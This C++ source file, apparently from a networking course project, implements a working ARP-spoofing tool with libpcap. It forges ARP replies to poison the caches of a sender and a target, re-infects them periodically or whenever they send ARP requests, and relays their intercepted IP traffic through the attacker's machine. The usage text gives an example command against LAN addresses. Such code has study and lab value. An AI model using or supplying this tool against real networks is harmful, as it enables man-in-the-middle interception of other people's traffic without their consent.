#pragma once
#include "needed.h"

void usage()
{
    printf("arp-spoof <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sudo ./arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

void sig_handler(int signo)
{
	if(signo == SIGINT)
    {
        chk_val = 0;
        Sem_post(&s);
		signal(SIGINT,SIG_DFL);	//make sigint default
    }
}

void init_arp(EthArpPacket& packet,Mac dmac, Mac smac_e, Mac smac_a, Ip sip, Mac tmac, Ip tip,uint16_t mode)
{
    packet.eth_.dmac_ = dmac;
    packet.eth_.smac_ = smac_e;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(mode);
    packet.arp_.smac_ = smac_a;
    packet.arp_.sip_ = htonl(sip);
    packet.arp_.tmac_ = tmac;
    packet.arp_.tip_ = htonl(tip);
}

void send_arp(pcap_t *handle,EthArpPacket& packet)
{
    Pthread_mutex_lock(&mutex1);
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
    Pthread_mutex_unlock(&mutex1);
    if (res != 0)
    {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        pthread_exit(NULL);
    }
}

const u_char * read_packet(pcap_t* handle)
{
    struct pcap_pkthdr *header;
    const u_char *packet;
    Pthread_mutex_lock(&mutex1);
    int res = pcap_next_ex(handle, &header, &packet);
    if (res == 0) return NULL;
    if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
    {
        printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
        return NULL;
    }
    Pthread_mutex_unlock(&mutex1);
    return packet;
}

void arp_infection(void* arg)
{
    Spoof_arg sarg = *(Spoof_arg*) arg; //because of call by reference while thread
    Sem_post(&sem);

    EthArpPacket p1;
    init_arp(p1,sarg.s_mac, sarg.a_mac, sarg.a_mac ,sarg.t_ip, sarg.s_mac, sarg.s_ip, ArpHdr::Reply);
    EthArpPacket p2;
    init_arp(p2,sarg.t_mac, sarg.a_mac, sarg.a_mac ,sarg.s_ip, sarg.t_mac, sarg.t_ip, ArpHdr::Reply);

    if(sarg.status == P)
    {
        while(chk_val)
        {
            time_t sT = time(NULL);
            volatile time_t eT = sT;
            Pthread_mutex_lock(&mutex2);
            send_arp(sarg.handle,p1);
            send_arp(sarg.handle,p2);
            Pthread_mutex_unlock(&mutex2);
            while((double)(eT-sT) < (double)PERIOD)
            {
                if(!chk_val) break;
                eT = time(NULL);
                Sem_wait(&s);
            }
        }
    }
    else if(sarg.status == NP)
    {
        const u_char *packet;
        EthArpPacket arp;
        EthIpPacket ip;

        while(chk_val)
        {
            Pthread_mutex_lock(&mutex2);
            packet = read_packet(sarg.handle);
            if (packet == NULL) continue;
            memcpy(&arp,packet, sizeof(arp));
            memcpy(&ip,packet,sizeof(ip));
            
            if(arp.eth_.type() == EthHdr::Arp)  //non periodic infection
            {
                if (arp.arp_.op() == ArpHdr::Request && (arp.arp_.tip() == sarg.t_ip || (arp.arp_.sip() == sarg.s_ip || arp.arp_.sip() == sarg.t_ip)))
                {
                    send_arp(sarg.handle,p1);
                    send_arp(sarg.handle,p2);
                }
            }
            
            else if(arp.eth_.type() == EthHdr::Ip4)  //relay
            {
                map<Ip,Mac> table = *(sarg.table);
                Ip sip = ip.ip_.sip();
                Ip dip = ip.ip_.dip();
                if(table.find(sip) != table.end() || table.find(dip) != table.end())
                {
                    ip.eth_.smac_ = sarg.a_mac;
                    ip.eth_.dmac_ = table[sarg.t_ip];
                    uint16_t offset = ETHER_HDR_LEN+IP_HDR_LEN;
                    uint16_t size = ip.ip_.tlen() - IP_HDR_LEN;
                    uint32_t total_size = size + offset + IP_HDR_LEN;
                    u_char* r_pkt = (u_char*)calloc(1, total_size+1);    //to make sure NULL;
                    memcpy(r_pkt,&ip,sizeof(EthIpPacket));
                    memcpy(r_pkt+sizeof(EthIpPacket),packet+offset,size);
                    
                    Pthread_mutex_lock(&mutex1);
                    int res = pcap_sendpacket(sarg.handle,(const u_char*)(r_pkt),total_size);
                    Pthread_mutex_unlock(&mutex1);
                    free(r_pkt);
                }
            }
            Pthread_mutex_unlock(&mutex2);
            Sem_post(&s);
            sleep(1.5);
        }
    }
}

Mac resolve_mac_by_arp(pcap_t *handle, Mac a_mac, Ip a_ip, Ip t_ip)
{
    struct pcap_pkthdr *header;
    const u_char *packet;
    Mac broadcast = Mac::broadcastMac();
    Mac lookup = Mac::nullMac();
    int cnt = 0;
    while(cnt < 3)
    {
        EthArpPacket p;
        init_arp(p,broadcast, a_mac, a_mac, a_ip, lookup, t_ip, ArpHdr::Request);
        send_arp(handle, p);

        EthArpPacket arp;
        time_t sT = time(NULL);
        while (true)
        {
            time_t eT = time(NULL);
            double time = (double)(eT-sT);
            if(time>3.0)
            {
                cnt++;
                break;
            }
            packet = read_packet(handle);
            if (packet != NULL)
            {
                memcpy(&arp, packet, sizeof(arp));
                if(arp.eth_.type() == EthHdr::Arp)
                {
                    Ip chk_a_ip(a_ip);
                    Mac chk_a_mac(a_mac);
                    Ip chk_t_ip(t_ip);
                    if (arp.arp_.op() == ArpHdr::Reply && chk_a_ip == arp.arp_.tip() && chk_t_ip == arp.arp_.sip() && chk_a_mac == arp.arp_.tmac())
                        return arp.arp_.smac();
                }
            }
        }
    }
    return lookup;
}

Mac get_attacker_mac(const char *dev)
{
    char buf[MAC_LEN + 1] = {0};

    int len = strlen(dev);
    int sz = len + 24; //NULL considered
    char *path = (char *)malloc(sz);
    if (path == NULL)
    {
        perror("path malloc failed");
        exit(-1);
    }

    snprintf(path, sz, "%s%s%s", "/sys/class/net/", dev, "/address");
    int fd = open(path, O_RDONLY);
    if (fd == -1)
    {
        perror("open failed");
        exit(-1);
    }

    int bytes = read(fd, buf, MAC_LEN);
    if (bytes != MAC_LEN)
    {
        fprintf(stderr, "mac addr read failed");
        free(path);
        close(fd);
    }

    free(path);
    close(fd);
    return Mac(buf);
}

Ip get_attacker_ip(const char *dev)
{
    struct ifreq ifr;
    char buf[IP_LEN+1] = {0};

    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s == -1)
    {
        perror("socket creation failed");
        exit(-1);
    }
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    if (ioctl(s, SIOCGIFADDR, &ifr) < 0)
    {
        perror("ioctl error");
        close(s);
        exit(-1);
    }
    else
        inet_ntop(AF_INET, ifr.ifr_addr.sa_data + sizeof(u_short),buf,sizeof(struct sockaddr));

    close(s);
    return Ip(buf);
}

STATUS rt_func(void* arg)
{
    Resolve_arg tmp = *((Resolve_arg*)arg);
    Sem_post(&sem);
    Mac ret = resolve_mac_by_arp(tmp.handle,tmp.a_mac,tmp.a_ip,tmp.ip);
    if(ret == Mac::nullMac())
    {
        printf("TIMEOUT : %s resolving failed..\n",string(tmp.ip).c_str());
        return NO;
    }
    *(tmp.ans) = ret;
    return OK;
}
void recover(void* arg)
{
    Recover_arg rarg = *((Recover_arg*)arg);
    Sem_post(&sem);
    for(int i=0;i<5;i++) send_arp(rarg.handle,rarg.p);  //to make sure
}